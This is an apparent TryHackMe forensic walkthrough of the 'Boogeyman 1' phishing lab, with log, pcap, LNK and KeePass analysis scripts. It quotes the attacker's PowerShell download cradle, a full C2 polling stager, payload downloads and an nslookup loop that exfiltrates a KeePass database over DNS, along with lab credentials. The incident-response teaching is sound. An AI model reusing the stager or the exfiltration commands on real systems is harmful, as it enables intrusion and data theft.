# TryHackMe — Boogeyman 1: Full Walkthrough

## 0. Setup

### Tools

```bash
sudo apt install -y tshark p7zip-full jq python3-venv wireshark
python3 -m venv venv
./venv/bin/pip install lnkparse3 pycryptodome pykeepass
```

| Tool | Used for |
|---|---|
| `tshark` / Wireshark | Reading `capture.pcapng` |
| `7z` | Opening the password-protected ZIP |
| `jq` | Querying the PowerShell log (JSON) |
| `lnkparse3` | Parsing the Windows shortcut (`.lnk`). This is the tool the room asks for |
| `pycryptodome` | AES for the manual KeePass decrypt |
| `pykeepass` | Opening the `.kdbx` file the easy way |

### Folder layout

```
boogeyman/
├── artefacts/
│   ├── dump.eml            # the phishing email
│   ├── powershell.evtx     # Windows PowerShell/Operational log
│   ├── powershell.json     # same log, already converted to JSON
│   └── capture.pcapng      # network capture (48,858 frames)
├── work/scripts/           # the six scripts in this writeup
└── solve/                  # everything the scripts produce
```

All commands run from the `boogeyman/` folder. Start by checking what you have:

```bash
cd artefacts && file * && cd ..
```

```
capture.pcapng  : pcapng capture file - version 1.0
dump.eml        : RFC 822 mail, ASCII text, with CRLF line terminators
powershell.evtx : MS Windows Vista-8.1 Event Log, 11 chunks ...
powershell.json : New Line Delimited JSON text data
```

> ⚠️ Some files you'll carve out of the evidence are **real attacker tools** (`sb.exe`, `sq3.exe`, the PowerShell stager). Analyse them; don't run them.

---

## 1. Attack overview

Keep this map in mind. Every question is one step on it.

```
 dump.eml ──► Invoice.zip (password "Invoice2023!" in the email body)
                 └─► Invoice_20230103.lnk   (disguised with an Excel icon)
                        └─► powershell -nop -windowstyle hidden -enc <base64>
                               └─► iex(downloadstring http://files.bpakcaging.xyz/update)
                                      └─► stager: polls C2 cdn.bpakcaging.xyz:8080
                                            ├─ GET  /b86459bb  → next command
                                            └─ POST /27fe2489  → command output
   attacker over the C2:
     ├─ downloads Seatbelt (sb.exe), enumerates the host
     ├─ finds  C:\Users\j.westcott\Documents\protected_data.kdbx  (KeePass)
     ├─ downloads sq3.exe (sqlite3), dumps Sticky Notes (plum.sqlite) → KeePass master password
     └─ hex-encodes the .kdbx and sends it out with nslookup (DNS) to 167.71.211.113
```

---

## 2. Email analysis (Q1–Q6)

### 2.1 Read the headers

You can open `dump.eml` in a text editor or Thunderbird. The script below prints only the headers that matter and saves the attachment.

```bash
python3 work/scripts/01_extract_eml.py artefacts/dump.eml solve/eml
```

```
From        : Arthur Griffin <agriffin@bpakcaging.xyz>
To          : Julianne Westcott <julianne.westcott@hotmail.com>
Return-Path : agriffin@bpakcaging.xyz
Subject     : Collection for Quick Logistics LLC - Jan 2023

-- auth / relay --
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; ...
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api; ...
List-Unsubscribe: <mailto:unsubscribe+...@bounces.elasticemail.net?...>
Received: from pa80.mxout.mta1.net (15.235.99.80) by ...outlook.com

BODY HINT: You may use this code to view the encrypted file: Invoice2023!

-- attachments --
Invoice.zip   application/zip   908 bytes -> solve/eml/Invoice.zip
```

**How to read it:**

- **Q1 (sender):** `From`, `Sender` and `Return-Path` all show **`agriffin@bpakcaging.xyz`**. Note the lookalike domain: `bpakcaging` is a misspelling of "bpackaging".
- **Q2 (victim):** the `To:` header is **`julianne.westcott@hotmail.com`**.
- **Q3 (relay service):** there are two DKIM signatures. The second is from `d=elasticemail.com`, and the unsubscribe address is on `bounces.elasticemail.net`. The attacker sent the mail through the bulk-mail service **Elastic Email** (answer: `elasticemail`). Because SPF and DKIM pass, the email reached the inbox.

<details><summary>Quick manual alternative</summary>

```bash
grep -iE '^(From|To|Return-Path|DKIM-Signature|List-Unsubscribe):' artefacts/dump.eml
grep -i 'code' artefacts/dump.eml          # the password is in the body text
```
</details>

### 2.2 Open the encrypted attachment

```bash
7z l -slt solve/eml/Invoice.zip | grep -E 'Path|Encrypted|Method'
#   Path = Invoice_20230103.lnk
#   Encrypted = +
#   Method = ZipCrypto Deflate

7z x -y -p'Invoice2023!' -osolve/zip solve/eml/Invoice.zip
```

- **Q4 (file inside):** **`Invoice_20230103.lnk`**. It's a Windows shortcut pretending to be an invoice.
- **Q5 (password):** **`Invoice2023!`**. It's in the email body. Attackers encrypt ZIPs so that email scanners can't look inside.

### 2.3 Parse the LNK with lnkparse (Q6)

```bash
./venv/bin/lnkparse solve/zip/Invoice_20230103.lnk
```

```
Link flags: ... HasArguments | HasIconLocation | IsUnicode ...
Windowstyle: SW_SHOWMINNOACTIVE
Hotkey: CONTROL - C {0x4302}
DATA:
   Description: Invoice Jan 2023
   Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
   Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0A...ApAA==
   Icon location: C:\Users\Administrator\Desktop\excel.ico
```

**Q6:** the encoded payload is the value after `-enc`:

```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

PowerShell's `-enc` takes base64 of **UTF-16LE** text, so decode it like this:

```bash
echo 'aQBlAHgAIAAo...ApAA==' | base64 -d | iconv -f utf-16le -t utf-8
# iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

This is a "download cradle": it downloads the next stage and runs it in memory. The shortcut also hides its window, shows an Excel icon and sets a Ctrl+C hotkey so that it looks like a document.

The script below does the parsing and decoding together. If `lnkparse` isn't installed, it searches the file's raw bytes instead:

```bash
./venv/bin/python work/scripts/02_lnk.py solve/zip/Invoice_20230103.lnk
```

---

## 3. Endpoint analysis (Q7–Q14)

The PowerShell log records **Event ID 4104 (Script Block Logging)**: the exact text of every command PowerShell ran. That includes every command the attacker typed through the C2.

### 3.1 Read the log: three options

**Option A: jq (fast)**

`powershell.json` keeps one record per line, but lines end with a bare carriage return (`\r`), not `\n`. Convert those first, then filter:

```bash
tr '\r' '\n' < artefacts/powershell.json \
  | jq -r 'select(.EventID==4104) | "\(.Timestamp)  \(.ScriptBlockText)"' \
  | grep -v 'PSMessageDetails\|^\s*$' | sort -u | less
```

**Option B: the script (timeline with duplicates removed)**

```bash
python3 work/scripts/03_ps_timeline.py artefacts/powershell.json solve/out/ps_timeline.txt
```

```
records: 987
event ids: {4104: 939, 4100: 44, 40962: 1, 53504: 2, 40961: 1}
hosts: {'QL-WKSTN-5693'}
unique 4104 script blocks: 39 -> solve/out/ps_timeline.txt
```

**Option C: Windows.** Open `powershell.evtx` in Event Viewer and filter on ID 4104, or run `Get-WinEvent -Path .\powershell.evtx | ? Id -eq 4104 | select TimeCreated, Message`.

### 3.2 The attacker's commands, in order (UTC, 13 Jan 2023)

Noise removed. Each command ends with `;pwd` because the operator was getting their bearings after every step.

| Time | Command | Meaning |
|---|---|---|
| 17:10:07 | `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')` | LNK runs and fetches the stager |
| 17:10:09 | `$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';... while($true){ GET /b86459bb ... iex $c ... POST /27fe2489 ...; sleep 0.8}` | **The C2 stager** (shown in full below) |
| 17:10:24 | `whoami`, `cd C:\`, `ls`, `cd Users`, `cd j.westcott`, `ps` | Looking around the host |
| 17:12:17 | `iex(...downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/.../Invoke-Seatbelt.ps1'))` | First try at Seatbelt. Fails: the URL returns an HTML page, not the script |
| 17:14:33 | `iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe` | Downloads **Seatbelt** into `Music\` |
| 17:15–17:18 | `.\sb.exe all`, `.\sb.exe -group=all`, `.\sb.exe -group=user` | Host enumeration |
| 17:19:06 | `ls C:\Users\j.westcott\Documents\protected_data.kdbx` | Finds the KeePass database |
| 17:22:53 | `ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState` | Looks at the Sticky Notes storage |
| 17:23:38 | `iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe` | Downloads sqlite3 |
| 17:25:38 | `.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"` | **Dumps every sticky note** |
| 17:32:15 | `$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);` | Reads the database |
| 17:32:23 | `$hex = ($bytes\|ForEach-Object ToString X2) -join '';` | **Hex-encodes** it |
| 17:32:41 | `$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" $destination;} echo "Done";` | **Sends it out over DNS with nslookup** |

The full stager, formatted for reading:

```powershell
$s='cdn.bpakcaging.xyz:8080'; $i='8cce49b0-b86459bb-27fe2489'; $p='http://'
$v = Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i}     # check in
while ($true) {
    $c = (Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content  # get next command
    if ($c -ne 'None') {
        $r = iex $c -ErrorAction Stop -ErrorVariable e                                        # run it
        $r = Out-String -InputObject $r
        $t = Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} `
             -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')                   # send output back
    }
    sleep 0.8
}
```

> The last line of the loop matters later. Command output is sent as **UTF-8 byte values written as decimal numbers separated by spaces** (for example `80 97 116 104` = `Path`). You need this to read the C2 traffic in section 5.

### 3.3 Answers

- **Q7 (domains, alphabetical):** **`cdn.bpakcaging.xyz,files.bpakcaging.xyz`**
  - `files.` hosts the files (`/update`, `/sb.exe`, `/sq3.exe`).
  - `cdn.` (port 8080) is the C2 server.
- **Q8 (enumeration tool):** **`Seatbelt`** (downloaded as `sb.exe`; a GhostPack tool for host enumeration).
- **Q9 (file opened with sq3.exe):** **`C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite`**.
  The command used a relative path. It ran from `C:\Users\j.westcott` (the `.\Music\sq3.exe` prefix shows that). The question asks for the full path **with escaped backslashes** (`\\`).
- **Q10 (software using that file):** **`Microsoft Sticky Notes`**. `plum.sqlite` is where Sticky Notes stores its notes.
- **Q11 (exfiltrated file):** **`protected_data.kdbx`**
- **Q12 (.kdbx file type):** **`KeePass`** (KeePass 2.x password database).
- **Q13 (encoding):** **`hex`** (`ToString X2` turns each byte into two uppercase hex digits).
- **Q14 (exfiltration tool):** **`nslookup`**

---

## 4. Network analysis (Q15–Q17)

### 4.1 Get an overview

```bash
tshark -r artefacts/capture.pcapng -q -z io,phs | head -20     # which protocols are present
tshark -r artefacts/capture.pcapng -q -z conv,ip | head -20     # who talks to whom
```

Main hosts:

| IP | Name | Role |
|---|---|---|
| 10.10.182.255 | QL-WKSTN-5693 | Victim |
| 167.71.211.113 | files.bpakcaging.xyz | File server and DNS exfiltration target |
| 159.89.205.40 | cdn.bpakcaging.xyz | C2 (port 8080) |

### 4.2 Q15: what software is the file server?

The server name is in the HTTP `Server` response header:

```bash
tshark -r artefacts/capture.pcapng -Y 'http.request && http.host contains "files.bpakcaging"' \
       -T fields -e frame.number -e http.host -e http.request.uri
#   33253  files.bpakcaging.xyz  /update
#   38730  files.bpakcaging.xyz  /sb.exe
#   42700  files.bpakcaging.xyz  /sq3.exe

tshark -r artefacts/capture.pcapng -Y 'http.response && ip.src==167.71.211.113' \
       -T fields -e http.server | sort -u
#   SimpleHTTP/0.6 Python/3.10.7
```

**Q15:** `SimpleHTTP/0.6 Python/...` is the banner of Python's built-in web server (`python3 -m http.server`). Answer: **`Python`** (SimpleHTTPServer).

*In Wireshark:* filter `http.host == "files.bpakcaging.xyz"`, then right-click a request → **Follow → HTTP Stream** and look at the `Server:` line.

### 4.3 Q16: which HTTP method carries C2 output?

```bash
tshark -r artefacts/capture.pcapng -Y 'http.request && ip.dst==159.89.205.40' \
       -T fields -e http.request.method -e http.request.uri | sort | uniq -c
#      1 GET   /8cce49b0     ← check-in
#    886 GET   /b86459bb     ← "any command for me?" (reply is "None" when there isn't)
#     42 POST  /27fe2489     ← command output
```

**Q16:** **`POST`**. This matches the stager you read in the PowerShell log.

### 4.4 Q17: which protocol was used to exfiltrate?

```bash
tshark -r artefacts/capture.pcapng \
       -Y 'dns.flags.response==0 && dns.qry.name matches "^[0-9A-Fa-f]+\\.bpakcaging\\.xyz$"' \
       -T fields -e frame.number -e dns.qry.name | head -3
#   47776  03D9A29A67FB4BB50100030002100031C1F2E6BF714350BE58.bpakcaging.xyz
#   47786  05216AFC5AFF03040001000000042000AF4DE7A467FADFBFEB.bpakcaging.xyz
#   ...
```

**Q17:** **`DNS`**. Each lookup carries 50 hex characters (25 bytes of the file) in the sub-domain. The first chunk starts with `03D9A29A67FB4BB5`, which is the **KeePass file signature**. That confirms these lookups carry `protected_data.kdbx`.

*In Wireshark:* filter `dns.qry.name contains "bpakcaging"`.

---

## 5. Getting the KeePass password (Q18)

The `.kdbx` file is encrypted, so the attacker needed its master password. The log showed them dumping Sticky Notes. **The result of that dump went back to the C2 inside a POST request.** You need to decode those POST bodies.

### 5.1 Decoding the C2 output

The stager sends `UTF8.GetBytes($e+$r) -join ' '`, so a POST body looks like this:

```
13 10 13 10 80 97 116 104 32 32 ...      →   "\r\n\r\nPath  ..."
```

You can do one by hand. In Wireshark, follow a `POST /27fe2489` stream, copy the body and paste it into CyberChef with the recipe **From Decimal (Delimiter: Space)**.

There are 42 of them, so it's easier to decode them all with a script:

```bash
python3 work/scripts/04_c2_decode.py artefacts/capture.pcapng solve/c2
ls solve/c2            # 42 files, one per command, named <frame>_<n>.txt
```

Some useful outputs:

| File | What it shows |
|---|---|
| `033401_02.txt` | `ql-wkstn-5693\j.westcott` (whoami) |
| `039425_16.txt`… | Seatbelt banner and output |
| `040484_21.txt` | `protected_data.kdbx`, **2206 bytes**. Note the size; you'll check against it later |
| `042313_29.txt` | Contents of the Sticky Notes `LocalState` folder (`plum.sqlite`, `plum.sqlite-wal`) |
| **`044467_34.txt`** | **The sqlite dump of the notes** |
| `048732_42.txt` | Output of the nslookup loop, ending in `Done` |

```bash
cat solve/c2/044467_34.txt
```

```
\id=868150bd-a564-423b-9256-70d3781794b1 Master Password
\id=ad8b52f0-e1bb-40f6-bbf9-47a53f9180ab %p9^3!lL^Mz47E2GaT^y|ManagedPosition=...
```

The victim kept a note titled "Master Password" on their desktop.

**Q18:** **`%p9^3!lL^Mz47E2GaT^y`**

---

## 6. Rebuilding and opening the exfiltrated database (Q19)

### 6.1 Put the file back together from DNS

```bash
python3 work/scripts/05_dns_rebuild.py artefacts/capture.pcapng solve/out/protected_data.kdbx
```

```
queries to bpakcaging.xyz : 284
hex-labelled (chunk) ones : 89
unique chunks             : 89 {50: 88, 12: 1}

hex chars 4412 -> 2206 bytes written to solve/out/protected_data.kdbx
magic: 03d9a29a67fb4bb5 (03d9a29a67fb4bb5 = KeePass 2.x)
version: 01000300 (0x00030001 = KDBX 3.1)
```

Why 284 queries but only 89 chunks? The victim's Windows resolver also tried each name with its **DNS search suffixes** (`…bpakcaging.xyz.eu-west-1.compute.internal` and `…ec2-utilities.amazonaws.com`). Keep only names that end exactly in `bpakcaging.xyz`. The result is **2206 bytes**, the same size the attacker's `ls` showed. That proves the rebuild is complete.

<details><summary>One-liner alternative (no script)</summary>

```bash
tshark -r artefacts/capture.pcapng \
  -Y 'dns.flags.response==0 && dns.qry.name matches "^[0-9A-Fa-f]+\\.bpakcaging\\.xyz$"' \
  -T fields -e dns.qry.name \
  | cut -d. -f1 | tr -d '\n' | xxd -r -p > solve/out/protected_data.kdbx
ls -l solve/out/protected_data.kdbx    # must be 2206 bytes
```
</details>

### 6.2 Open it: easy way

Use the **KeePassXC** GUI (`sudo apt install keepassxc`) or `pykeepass`:

```bash
./venv/bin/python -c "
from pykeepass import PyKeePass
kp = PyKeePass('solve/out/protected_data.kdbx', password='%p9^3!lL^Mz47E2GaT^y')
for e in kp.entries: print(e.title, e.username, e.password, e.custom_properties)"
```

```
Company Card None None {'Account Number': '4024007128269551', 'CVV': '970', 'Expiration Date': '3/2028', 'Name': 'Quick Logistics LLC'}
Sample Entry #2 Michael321 12345 {}
Sample Entry User Name Password {}
```

In KeePassXC, the card number is under **Homebanking → Company Card → Advanced → Additional attributes**.

**Q19:** **`4024007128269551`**

### 6.3 Open it: manual way (to learn how KDBX works)

`06_kdbx_decrypt.py` decrypts the database step by step with only AES and SHA-256. It's useful if you want to see how KeePass protects data, or if a library refuses the file.

```bash
./venv/bin/python work/scripts/06_kdbx_decrypt.py \
    solve/out/protected_data.kdbx '%p9^3!lL^Mz47E2GaT^y' solve/out/kdbx.xml
```

```
signature 0x9AA2D903/0xB54BFB67  version 0x00030001
header length: 222  cipher: 31c1f2e6bf714350be5805216afc5aff  rounds: 60000
[+] stream-start bytes match - password is correct
[+] gzip at plaintext offset 72 -> 12261 bytes XML -> solve/out/kdbx.xml

[Homebanking] Company Card
    Account Number   4024007128269551
    CVV              970
    Expiration Date  3/2028
    Name             Quick Logistics LLC
```

How KDBX 3.1 encryption works:

```
composite   = SHA256( SHA256(password) )
transformed = AES-256-ECB(key = transform_seed).encrypt(composite)   repeated 60,000 times
master_key  = SHA256( master_seed || SHA256(transformed) )
plaintext   = AES-256-CBC(master_key, IV).decrypt(body)
check       : plaintext[0:32] == stream_start header field   → proves the password is right
payload     : hashed blocks → gzip → XML (protected values use Salsa20)
```

## Appendix: script listings

All scripts are in `work/scripts/`. They use only the Python standard library plus `tshark`, except `02` (`lnkparse3`, optional) and `06` (`pycryptodome`).

### A. `01_extract_eml.py`: email headers and attachment

```python
#!/usr/bin/env python3
"""Step 1 - read dump.eml: headers of interest + carve all attachments."""
import email
import os
import re
import sys
from email import policy

EML = sys.argv[1] if len(sys.argv) > 1 else "artefacts/dump.eml"
OUT = sys.argv[2] if len(sys.argv) > 2 else "out/eml"
os.makedirs(OUT, exist_ok=True)

msg = email.message_from_binary_file(open(EML, "rb"), policy=policy.default)
for f in ("From", "To", "Reply-To", "Return-Path", "Sender", "Subject", "Date", "Message-Id"):
    print(f"{f:12}: {msg.get(f)}")

print("\n-- auth / relay --")
for f in ("Authentication-Results", "Received-SPF", "DKIM-Signature",
          "List-Unsubscribe", "X-MS-Exchange-Organization-SCL", "X-Sender-IP"):
    for v in msg.get_all(f) or []:
        print(f"{f}: {' '.join(str(v).split())[:200]}")
print("Received chain:")
for v in msg.get_all("Received") or []:
    print("  ", " ".join(str(v).split())[:160])

body = msg.get_body(preferencelist=("plain", "html"))
text = body.get_content() if body else ""
for line in text.splitlines():
    if re.search(r"password|code|encrypt", line, re.I) and line.strip():
        print("\nBODY HINT:", line.strip())

print("\n-- attachments --")
for part in msg.iter_attachments():
    name = part.get_filename()
    data = part.get_payload(decode=True)
    path = os.path.join(OUT, name)
    open(path, "wb").write(data)
    print(f"{name:28} {part.get_content_type():24} {len(data)} bytes -> {path}")
```

### B. `02_lnk.py`: parse the LNK and decode the `-enc` payload

```python
#!/usr/bin/env python3
"""Step 2 - LNK metadata + decode the encoded command line argument.

Requires LnkParse3:  pip install lnkparse3      (or ./venv/bin/pip install lnkparse3)
Usage: 02_lnk.py <file.lnk>
"""
import base64
import os
import re
import shutil
import subprocess
import sys

LNK = sys.argv[1] if len(sys.argv) > 1 else "Invoice_20230103.lnk"

# Find the lnkparse CLI: next to the running interpreter (venv) first, then on PATH.
exe = os.path.join(os.path.dirname(sys.executable), "lnkparse")
if not os.path.exists(exe):
    exe = shutil.which("lnkparse")

print("== lnkparse ==")
if exe:
    r = subprocess.run([exe, LNK], capture_output=True, text=True)
    out = r.stdout or r.stderr
else:
    out = "(lnkparse not installed - falling back to a raw search of the file)\n"
keys = re.compile(r"^(Description|Relative path|Working directory|Icon location|Hotkey|"
                  r"Windowstyle|Command line arguments|Link flags)", re.I)
for line in out.splitlines():
    if keys.match(line.strip()):
        print(" ", line.strip()[:400])

print("\n== encoded command line ==")
blob = ""
m = re.search(r"-enc\s+([A-Za-z0-9+/=]{40,})", out)
if m:
    blob = m.group(1)
if not blob:
    # Fallback: the LNK has the IsUnicode flag, so its StringData (including the
    # arguments) is stored as UTF-16LE. Decode the file that way and search it.
    # The string may start at an odd offset, so try both byte alignments.
    raw = open(LNK, "rb").read()
    for start in (0, 1):
        text = raw[start:].decode("utf-16le", "ignore")
        m = re.search(r"-enc\s+([A-Za-z0-9+/=]{40,})", text)
        if m:
            blob = m.group(1)
            break
print("base64:", blob)
try:
    print("\ndecoded:", base64.b64decode(blob).decode("utf-16le"))
except Exception as exc:
    print("decode failed:", exc)
```

### C. `03_ps_timeline.py`: PowerShell log to attack timeline

```python
#!/usr/bin/env python3
"""Step 3 - parse powershell.json (CR-separated NDJSON) and print the attack timeline.

The file has one JSON object per record separated by bare CR, so json.load() and
line-by-line json.loads() both fail. Use raw_decode() in a loop.

Usage: 03_ps_timeline.py artefacts/powershell.json [timeline.txt]
"""
import json
import os
import sys
from collections import Counter

SRC = sys.argv[1] if len(sys.argv) > 1 else "artefacts/powershell.json"
DST = sys.argv[2] if len(sys.argv) > 2 else "out/ps_timeline.txt"

raw = open(SRC, encoding="utf-8", errors="replace").read()
dec = json.JSONDecoder()
recs, i = [], 0
while i < len(raw):
    while i < len(raw) and raw[i] in " \r\n\t":
        i += 1
    if i >= len(raw):
        break
    try:
        obj, i = dec.raw_decode(raw, i)
    except json.JSONDecodeError:
        break
    recs.append(obj)

print("records:", len(recs))
print("event ids:", dict(Counter(r.get("EventID") for r in recs)))
print("hosts:", {r.get("Hostname") for r in recs})
print("user sids:", {r.get("SID") for r in recs})

# 4100 records the command line that started the engine -> proves the .lnk launched PS
seen_ha = set()
for r in recs:
    for line in (r.get("ContextInfo") or "").splitlines():
        if "Host Application" in line:
            t = line.strip()
            if t not in seen_ha:
                seen_ha.add(t)
                print("\n[4100]", r["Timestamp"], t[:300])

recs.sort(key=lambda r: r["Timestamp"])
seen, lines = set(), []
for r in recs:
    if r.get("EventID") != 4104:
        continue
    t = (r.get("ScriptBlockText") or "").strip()
    if not t or t in seen:
        continue
    seen.add(t)
    one = " ".join(t.split())
    lines.append(f"{r['Timestamp']}  {one}")

os.makedirs(os.path.dirname(DST) or ".", exist_ok=True)
open(DST, "w").write("\n".join(lines) + "\n")
print(f"\nunique 4104 script blocks: {len(lines)} -> {DST}\n")
for ln in lines:
    print(ln[:220])
```

### D. `04_c2_decode.py`: decode the C2 POST bodies

```python
#!/usr/bin/env python3
"""Step 4 - decode the C2 command output from the pcap.

The stager uploads with  -Body ([Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
so the POST body on the wire is the file's UTF-8 bytes written as decimal numbers
separated by spaces.  tshark hands them over hex-encoded (they start with CR/LF), so:

    pass 1: hex  -> ascii   "13 13 10 13 10 80 97 116 ..."
    pass 2: decimal -> bytes -> utf-8   "Path ..."

Usage: 04_c2_decode.py artefacts/capture.pcapng out/c2
"""
import os
import re
import subprocess
import sys

PCAP = sys.argv[1] if len(sys.argv) > 1 else "artefacts/capture.pcapng"
OUT = sys.argv[2] if len(sys.argv) > 2 else "out/c2"
C2_IP = "159.89.205.40"
os.makedirs(OUT, exist_ok=True)

res = subprocess.run(
    ["tshark", "-r", PCAP, "-Y",
     f'http.request.method=="POST" && ip.dst=={C2_IP}',
     "-T", "fields", "-e", "frame.number", "-e", "http.file_data"],
    capture_output=True, text=True)

written = 0
for line in res.stdout.splitlines():
    parts = line.split("\t")
    if len(parts) < 2 or not parts[1]:
        continue
    frame, data = parts[0], parts[1].replace(":", "")
    try:
        raw = bytes.fromhex(data) if re.fullmatch(r"[0-9a-fA-F]+", data) else data.encode()
    except ValueError:
        continue
    text = raw.decode("utf-8", "replace")

    # pass 2 only if the body really is a list of decimal byte values
    printable = sum(c.isdigit() or c.isspace() for c in text)
    if printable > 0.9 * len(text) and text.strip():
        nums = [int(n) for n in text.split() if n.isdigit() and int(n) < 256]
        text = bytes(nums).decode("utf-8", "replace")

    written += 1
    path = os.path.join(OUT, f"{int(frame):06d}_{written:02d}.txt")
    open(path, "w", encoding="utf-8").write(text)

print("POST bodies decoded:", written, "->", OUT)

# what we are looking for: the Sticky Notes dump and the kdbx path
for fn in sorted(os.listdir(OUT)):
    t = open(os.path.join(OUT, fn), encoding="utf-8", errors="replace").read()
    if re.search(r"Master Password|plum\.sqlite|SELECT|copyright", t, re.I):
        print(f"\n===== {fn} ({len(t)} chars) =====")
        print(t.strip()[:1200])
```

### E. `05_dns_rebuild.py`: rebuild the `.kdbx` from DNS lookups

```python
#!/usr/bin/env python3
"""Step 5 - rebuild protected_data.kdbx from the DNS tunnel.

Stager:  $hex = ($bytes | % ToString X2) -join ''
         $split = $hex -split '(\\S{50})'
         foreach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113 }

So every query QNAME is <50 hex chars>.bpakcaging.xyz.  Windows appends the DNS search
suffix, so each chunk also appears as <label>.bpakcaging.xyz.eu-west-1.compute.internal
and ...eu-west-1.ec2-utilities.amazonaws.com - anchor the regex on the bare QNAME
(284 queries -> 89 real chunks).  Consecutive duplicates are dropped as a safety net
for nslookup retransmissions (there are none in this capture).

NOTE: the last chunk is only 12 chars long, so never filter on label length - filter
on "the label is hex".  Dropping it yields a 6-byte-short file that only fails later
with "Data must be padded to 16 byte boundary in CBC mode".

Usage: 05_dns_rebuild.py artefacts/capture.pcapng out/protected_data.kdbx
"""
import os
import re
import subprocess
import sys

PCAP = sys.argv[1] if len(sys.argv) > 1 else "artefacts/capture.pcapng"
DST = sys.argv[2] if len(sys.argv) > 2 else "out/protected_data.kdbx"

res = subprocess.run(
    ["tshark", "-r", PCAP, "-Y",
     'dns.flags.response==0 && dns.qry.name contains "bpakcaging.xyz"',
     "-T", "fields", "-e", "dns.qry.name"],
    capture_output=True, text=True)

all_q = [q.strip().lower() for q in res.stdout.splitlines() if q.strip()]
hex_q = [q for q in all_q if re.fullmatch(r"[0-9a-f]{8,50}\.bpakcaging\.xyz", q)]
print(f"queries to bpakcaging.xyz : {len(all_q)}")
print(f"hex-labelled (chunk) ones : {len(hex_q)}")

chunks, prev = [], None
for q in hex_q:                      # drop consecutive retransmissions (none here)
    label = q[:-len(".bpakcaging.xyz")]
    if label != prev:
        chunks.append(label)
    prev = label

from collections import Counter
print("unique chunks             :", len(chunks), dict(Counter(len(c) for c in chunks)))

os.makedirs(os.path.dirname(DST) or ".", exist_ok=True)
blob = bytes.fromhex("".join(chunks))
open(DST, "wb").write(blob)
print(f"\nhex chars {sum(map(len, chunks))} -> {len(blob)} bytes written to {DST}")
print("magic:", blob[:8].hex(), "(03d9a29a67fb4bb5 = KeePass 2.x)")
print("version:", blob[8:12].hex(), "(0x00030001 = KDBX 3.1)")
```

### F. `06_kdbx_decrypt.py`: manual KeePass (KDBX 3.1) decrypt

```python
#!/usr/bin/env python3
"""Step 6 - decrypt the recovered KeePass 3.1 database and print its entries.

KDBX 3.1 key derivation:
    composite   = SHA256( SHA256(password) )
    transformed = AES-256-ECB(transform_seed).encrypt(composite)  x transform_rounds
    master_key  = SHA256( master_seed || SHA256(transformed) )      <- inner hash is mandatory
then  AES-256-CBC(master_key, iv).decrypt(ciphertext)  must start with the 32 stream-start bytes.

Requires pycryptodome:  pip install pycryptodome
Usage: 06_kdbx_decrypt.py <db.kdbx> <password> [out.xml]
"""
import base64
import hashlib
import struct
import sys
import zlib

from Crypto.Cipher import AES

SRC = sys.argv[1] if len(sys.argv) > 1 else "out/protected_data.kdbx"
PW = (sys.argv[2] if len(sys.argv) > 2 else "").encode()
DST = sys.argv[3] if len(sys.argv) > 3 else "out/kdbx.xml"

d = open(SRC, "rb").read()
assert d[:4] == bytes.fromhex("03d9a29a"), "not a KDBX file"
sig2 = struct.unpack("<I", d[4:8])[0]
ver = struct.unpack("<I", d[8:12])[0]
print(f"signature 0x9AA2D903/0x{sig2:08X}  version 0x{ver:08X}")

# ---- header: TLV records, terminated by field id 0 -------------------------
FIELDS = {2: "cipher", 3: "compression", 4: "master_seed", 5: "transform_seed",
          6: "transform_rounds", 7: "iv", 8: "protected_stream_key",
          9: "stream_start", 10: "inner_random_stream"}
h, off = {}, 12
while True:
    fid = d[off]
    ln = struct.unpack("<H", d[off + 1:off + 3])[0]
    val = d[off + 3:off + 3 + ln]
    off += 3 + ln
    if fid == 0:
        break
    h[FIELDS.get(fid, f"field_{fid}")] = val

for k, v in h.items():
    printable = v.hex() if len(v) <= 2 else f"{len(v)} bytes {v[:8].hex()}..."
    print(f"  {k:20} {printable}")
print("header length:", off, " cipher:", h["cipher"].hex(), " rounds:",
      struct.unpack("<Q", h["transform_rounds"])[0])

# ---- key derivation -------------------------------------------------------
composite = hashlib.sha256(hashlib.sha256(PW).digest()).digest()
aes = AES.new(h["transform_seed"], AES.MODE_ECB)
for _ in range(struct.unpack("<Q", h["transform_rounds"])[0]):
    composite = aes.encrypt(composite)
key = hashlib.sha256(h["master_seed"] + hashlib.sha256(composite).digest()).digest()

# ---- decrypt the body (last 32 bytes are an unencrypted SHA-256 trailer) ---
ct = d[off:len(d) - 32]
ct = ct[:len(ct) // 16 * 16]
